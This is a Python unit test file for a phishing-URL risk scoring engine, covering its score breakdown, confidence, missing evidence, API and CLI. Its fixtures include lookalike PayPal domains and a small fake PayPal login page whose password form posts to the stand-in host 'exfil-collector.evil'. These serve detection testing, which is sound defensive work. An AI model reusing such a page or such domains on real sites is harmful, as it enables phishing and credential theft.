import asyncio
import base64
import io
import unittest
from contextlib import redirect_stdout
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, MagicMock, patch

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
from fastapi.testclient import TestClient

from app.core.scoring_engine import ScoringEngine
from app.core.threat_intel import ThreatIntelHub
from app.main import app
from app.models.database import init_db
from cli import cmd_scan


def _make_test_cert_der_b64(domain: str, age_days: int = 1, days_valid: int = 90) -> str:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    now = datetime.now(timezone.utc)
    subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, domain)])
    issuer = x509.Name([
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Let's Encrypt"),
        x509.NameAttribute(NameOID.COMMON_NAME, "R3"),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(days=age_days))
        .not_valid_after(now + timedelta(days=days_valid))
        .add_extension(
            x509.SubjectAlternativeName([x509.DNSName(domain)]),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )
    der = cert.public_bytes(serialization.Encoding.DER)
    return base64.b64encode(der).decode("ascii")


class TestExplainableScoring(unittest.TestCase):
    def setUp(self):
        init_db()
        self.engine = ScoringEngine()

    def test_lexical_scan_breakdown_reconciles_and_tracks_missing_evidence(self):
        async def run():
            return await self.engine.execute_scan(
                url="http://paypa1-security-verification.xyz/login",
                fetch_content=False,
                deep_dns=False,
            )

        report = asyncio.run(run())

        self.assertIn("confidence", report)
        self.assertIn("confidence_level", report)
        self.assertIn("score_breakdown", report)
        self.assertIn("engine_scores", report)
        self.assertIn("missing_evidence", report)

        # Breakdown points must sum exactly to overall_score
        breakdown_sum = round(sum(item["points"] for item in report["score_breakdown"]), 1)
        self.assertAlmostEqual(breakdown_sum, report["overall_score"], places=1)

        # Individual engine scores must contain all 4 pillars with weights summing to 1.0
        self.assertEqual(len(report["engine_scores"]), 4)
        self.assertAlmostEqual(sum(e["weight"] for e in report["engine_scores"]), 1.0, places=2)

        # Missing evidence must include skipped DOM, skipped DNS, plain HTTP TLS absence, and unconfigured CTI
        checks = {m["check"] for m in report["missing_evidence"]}
        self.assertIn("Live DOM & Form Inspection", checks)
        self.assertIn("DNS SPF/DMARC & Record Lookup", checks)
        self.assertIn("X.509 Certificate Inspection", checks)

        # Factor labels must show brand impersonation and homoglyph/TLD reasons
        labels = " ".join(item["label"] for item in report["score_breakdown"])
        self.assertIn("PayPal", labels)
        self.assertIn("Homoglyph", labels)
        self.assertLess(report["confidence"], 85.0)

    def test_live_amplification_breakdown_and_high_confidence(self):
        domain = "xn--pypal-login-secure-8qa.xyz"
        html_body = (
            "<html><title>PayPal Security Center</title>"
            "<body><form action='https://exfil-collector.evil/post'>"
            "<input type='password' name='pwd'></form></body></html>"
        )
        fake_bundle = {
            "target_url": f"https://{domain}/auth",
            "final_url": f"https://{domain}/auth",
            "status_code": 200,
            "headers": {"server": "nginx"},
            "body_text": html_body,
            "bytes_read": len(html_body),
            "truncated": False,
            "redirect_chain": [{"hop": 1, "status_code": 200, "url": f"https://{domain}/auth"}],
            "redirect_downgrade": False,
            "resolved_ip": "93.184.216.34",
            "error": None,
            "error_type": None,
            "tls_cert_der_b64": _make_test_cert_der_b64(domain, age_days=1),
            "tls_version": "TLSv1.3",
            "tls_cipher": "TLS_AES_256_GCM_SHA384",
            "tls_error": None,
        }

        async def run():
            with patch("app.core.scoring_engine.run_in_restricted_worker", new=AsyncMock(return_value=fake_bundle)):
                with patch.object(self.engine.threat_intel, "query_urlhaus", new=AsyncMock(return_value=None)):
                    return await self.engine.execute_scan(
                        url=f"https://{domain}/auth",
                        fetch_content=True,
                        deep_dns=False,
                    )

        report = asyncio.run(run())
        self.assertGreaterEqual(report["overall_score"], 90.0)
        self.assertEqual(report["verdict"], "MALICIOUS")

        # Amplification override must appear explicitly in score_breakdown and reconcile exactly
        factors = [item["factor"] for item in report["score_breakdown"]]
        self.assertIn("correlation_amplification", factors)
        self.assertIn("password_form", factors)
        self.assertIn("cross_origin_form", factors)
        self.assertIn("fresh_cert_72h", factors)

        breakdown_sum = round(sum(item["points"] for item in report["score_breakdown"]), 1)
        self.assertAlmostEqual(breakdown_sum, report["overall_score"], places=1)

    def test_benign_full_evidence_has_high_confidence_and_clean_breakdown(self):
        domain = "trusted-clean-portal.example"
        html_body = "<html><title>Welcome Portal</title><body><p>Documentation</p></body></html>"
        fake_bundle = {
            "target_url": f"https://{domain}",
            "final_url": f"https://{domain}",
            "status_code": 200,
            "headers": {
                "strict-transport-security": "max-age=31536000; includeSubDomains",
                "content-security-policy": "default-src 'self'",
                "x-frame-options": "DENY",
                "x-content-type-options": "nosniff",
                "referrer-policy": "strict-origin-when-cross-origin",
                "permissions-policy": "geolocation=()",
            },
            "body_text": html_body,
            "bytes_read": len(html_body),
            "truncated": False,
            "redirect_chain": [{"hop": 1, "status_code": 200, "url": f"https://{domain}"}],
            "redirect_downgrade": False,
            "resolved_ip": "93.184.216.34",
            "error": None,
            "error_type": None,
            "tls_cert_der_b64": _make_test_cert_der_b64(domain, age_days=120),
            "tls_version": "TLSv1.3",
            "tls_cipher": "TLS_AES_256_GCM_SHA384",
            "tls_error": None,
        }
        # Avoid automated free CA +10 penalty by signing/using non-automated CA or accepting clean low score
        fake_dns = {
            "records": {"A": ["93.184.216.34"], "AAAA": [], "MX": ["10 mail.example."], "TXT": ["v=spf1 -all"], "NS": ["ns1.example."]},
            "ip_address": "93.184.216.34",
            "spf_record": "v=spf1 -all",
            "spf_status": "Hard Fail (-all) [Hardened]",
            "dmarc_record": "v=DMARC1; p=reject",
            "dmarc_status": "Enforced (p=reject) [Strong]",
            "fast_flux_detected": False,
            "contributions": [],
            "missing_evidence": [],
            "penalty": 0,
        }

        async def run():
            with patch("app.core.scoring_engine.run_in_restricted_worker", new=AsyncMock(return_value=fake_bundle)):
                with patch.object(self.engine.security_assessor, "inspect_dns_and_email_security", return_value=fake_dns):
                    with patch.object(self.engine.threat_intel, "query_urlhaus", new=AsyncMock(return_value=None)):
                        return await self.engine.execute_scan(
                            url=f"https://{domain}",
                            fetch_content=True,
                            deep_dns=True,
                        )

        report = asyncio.run(run())
        self.assertEqual(report["verdict"], "BENIGN")
        self.assertEqual(report["confidence_level"], "HIGH")
        self.assertGreaterEqual(report["confidence"], 80.0)
        breakdown_sum = round(sum(item["points"] for item in report["score_breakdown"]), 1)
        self.assertAlmostEqual(breakdown_sum, report["overall_score"], places=1)

    def test_threat_intel_contributions_and_outage_missing_evidence(self):
        hub = ThreatIntelHub()

        async def run():
            with patch("app.core.threat_intel.httpx.AsyncClient") as mock_client_cls:
                mock_client = MagicMock()
                mock_client.post = AsyncMock(side_effect=TimeoutError("urlhaus timeout"))
                mock_ctx = AsyncMock()
                mock_ctx.__aenter__.return_value = mock_client
                mock_ctx.__aexit__.return_value = None
                mock_client_cls.return_value = mock_ctx

                return await hub.evaluate("http://paypal-security-update-center.com/login")

        res = asyncio.run(run())
        self.assertGreater(res["score"], 0.0)
        self.assertTrue(any(c["factor"] == "local_cti_match" for c in res["contributions"]))
        self.assertTrue(any(m["check"] == "URLhaus (abuse.ch) Live Feed" for m in res["missing_evidence"]))
        self.assertFalse(res["details"]["urlhaus_checked"])

    def test_api_returns_explainable_fields_and_synced_metadata(self):
        client = TestClient(app)
        resp = client.post("/api/scan", json={
            "url": "http://paypa1-update-center.xyz/auth",
            "fetch_content": False,
            "deep_dns": False,
        })
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("score_breakdown", data)
        self.assertIn("engine_scores", data)
        self.assertIn("confidence", data)
        self.assertIn("confidence_level", data)
        self.assertIn("missing_evidence", data)
        self.assertEqual(len(data["engine_scores"]), 4)

        # Verify persisted scan endpoint returns full explainability fields
        hist = client.get(f"/api/scans/{data['scan_id']}")
        self.assertEqual(hist.status_code, 200)
        self.assertEqual(hist.json()["score_breakdown"], data["score_breakdown"])

        # Verify engine metadata weights match config weights (35% / 20% / 20% / 25%)
        meta = client.get("/api/engine-metadata").json()
        weights = [e["weight"] for e in meta["pipeline"]]
        self.assertEqual(weights, [0.35, 0.2, 0.2, 0.25])

        # Verify HTML dashboard contains explainability placeholders
        html_page = client.get("/").text
        self.assertIn("list-score-breakdown", html_page)
        self.assertIn("container-engine-scores", html_page)
        self.assertIn("list-missing-evidence", html_page)
        self.assertIn("res-confidence-badge", html_page)

    def test_cli_outputs_explainable_breakdown_and_missing_evidence(self):
        buf = io.StringIO()
        with redirect_stdout(buf):
            asyncio.run(cmd_scan(
                url="http://paypa1-security-verification.xyz/login",
                fetch_content=False,
                deep_dns=False,
            ))
        out = buf.getvalue()
        self.assertIn("Explainable Risk Score Breakdown", out)
        self.assertIn("Individual Engine Scores", out)
        self.assertIn("Missing Evidence", out)
        self.assertIn("Confidence:", out)


if __name__ == "__main__":
    unittest.main()
